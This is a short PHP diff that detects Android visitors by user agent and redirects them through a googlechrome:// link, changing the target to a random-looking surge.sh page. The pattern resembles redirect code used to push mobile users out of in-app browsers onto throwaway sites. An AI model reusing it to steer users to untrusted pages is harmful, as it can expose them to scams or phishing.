@@ -3,7 +3,7 @@ $iphone = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
 
 if ($iphone == true)
 {
-$url = "https://trofeorsmaterilesasasa.blogspot.com/";
+$url = "https://sedate-grade.surge.sh";
 $updateGoTo = "googlechrome://navigate?url=".$url;
 
 header(sprintf("Location: %s", $updateGoTo));
